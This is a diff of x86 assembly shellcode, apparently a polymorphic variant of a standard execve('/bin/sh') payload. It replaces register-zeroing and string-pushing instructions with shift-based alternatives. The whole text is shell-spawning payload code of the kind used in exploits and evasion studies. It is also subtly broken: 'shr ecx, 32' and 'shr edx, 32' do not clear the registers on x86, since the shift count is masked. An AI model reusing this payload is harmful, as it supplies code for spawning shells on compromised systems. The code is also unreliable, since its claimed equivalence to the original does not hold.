@@ -4,11 +4,13 @@ global _start
 section .text
 
 _start:
-	xor ecx, ecx
+	shr ecx, 32
 	mul ecx
-	push ecx
-	push 0x68732f2f   ;; hs//
-	push 0x6e69622f   ;; nib/
+	mov esi, 0x68732f2f
+	shr esi, 8
+	push esi
+	push 0x6e69622f
 	mov ebx, esp
-	mov al, 11
+	shr edx, 32
+	add eax, 11
 	int 0x80
